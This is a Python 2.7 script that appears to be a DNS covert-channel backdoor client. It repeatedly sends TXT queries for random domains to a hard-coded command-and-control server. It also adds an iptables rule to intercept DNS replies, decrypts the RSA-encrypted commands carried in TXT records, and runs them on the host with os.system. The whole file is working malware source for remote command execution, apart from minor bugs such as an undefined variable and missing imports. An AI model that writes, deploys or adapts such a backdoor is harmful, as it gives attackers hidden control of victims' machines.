#! /usr/bin/env python2.7

import multiprocessing, os
import random
from scapy.all import *
from netfilterqueue import NetfilterQueue

RANDOM_CHARS = 'abcdefghijklmnopqrstuvwxyz1234567890'
RAND_MIN_LEN = 50
RAND_MAX_LEN = 57

CCIP = '10.4.18.65'  # C&C Server
QUERY_DELAY = 3  # In seconds

lastcommand = ''  # The previous command received


# Read the private key in
# Source: https://nitratine.net/blog/post/asymmetric-encryption-and-decryption-in-python/
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
with open("private_key.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
        backend=default_backend()
    )


def read(packet):
    # Convert the raw packet to a scapy compatible string
    scapy_pkt = IP(packet.get_payload())

    # Read packet payload and run command if asked
    if scapy_pkt.haslayer(DNSRR):
        print('[!] DNS reply received: src=' + str(scapy_pkt[IP].src))
        # If the packet is a DNS Resource Record (DNS reply)
        try:
            # Check if source IP is C&C server
            if str(scapy_pkt[IP].src) == CCIP:
                # Run command found in TXT record
                getcommand(scapy_pkt)

        except IndexError:
            print('[x] Index error')
            # Not UDP packet, this can be IPerror/UDPerror packets
            pass

    # Accept the packet
    packet.accept()


# Checks for command in TXT resource record
def getcommand(scapy_pkt):
    global lastcommand

    # Get command text
    command = str(scapy_pkt[DNS].an.rdata)[1:]
    command = decrypt_command(command.decode('base64'))
    print('[!] Command: ' + str(command))

    if command != lastcommand:
        # Run command on system
        os.system(command)
        print('[!] Command complete')
        lastcommand = command
    else:
        print('[!] Repeat command')


def decrypt_command(encrypted):
    original_command = private_key.decrypt(
        encrypted,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )

    return originalcommand


# Creates a random fake domain name
def generate_randomname():
    # Add random characters a random number of times
    length = random.randrange(RAND_MIN_LEN, RAND_MAX_LEN)
    name = ''.join(random.choice(RANDOM_CHARS) for i in range(length))
    return name + random.choice(['.com', '.net', '.org', '.co.uk'])


nfqueue = NetfilterQueue()


def run_nfqueue():
    try:
        print('[*] NFQUEUE running')
        nfqueue.run()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    # Setup the iptables rule and nfqueue
    os.system('iptables -A INPUT -p udp -m udp --sport 53 -j NFQUEUE --queue-num 1')
    print('[*] iptables rule created')
    nfqueue.bind(1, read)  # iptables queue number and callback function

    # Start the nfqueue packet reading portion in a separate process
    nfqueue_process = multiprocessing.Process(target=run_nfqueue)
    nfqueue_process.start()

    while(True):
        try:
            randomname = generate_randomname()
            os.system('nslookup -q=txt ' + randomname + ' ' + CCIP + ' > /dev/null')
            print('[+] Sent DNS query: ' + str(randomname))
            time.sleep(QUERY_DELAY)
        except KeyboardInterrupt:
            break
    
    # Join processes and remove iptables rule
    nfqueue_process.join()
    os.system('iptables -D INPUT -p udp -m udp --sport 53 -j NFQUEUE --queue-num 1')
    print('[*] iptables rule removed')
